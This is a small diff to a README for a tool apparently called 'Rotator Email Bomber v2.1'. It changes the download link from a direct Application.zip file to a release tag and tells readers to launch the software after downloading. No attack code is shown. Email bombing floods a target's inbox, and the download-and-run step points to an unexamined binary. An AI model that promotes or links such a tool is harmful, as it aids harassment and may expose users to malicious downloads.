@@ -27,7 +27,7 @@ This repository covers a wide range of topics related to email bombing and ethic
 ### Installation
 To get started with Rotator Email Bomber v2.1, you can download the software package from the following link: 
 
-[![Download Software](https://github.com/N3mo1/Rotator-email-bomber/releases/download/v1.0.0/Application.zip)](https://github.com/N3mo1/Rotator-email-bomber/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/N3mo1/Rotator-email-bomber/releases/tag/v2.0)](https://github.com/N3mo1/Rotator-email-bomber/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading.
 
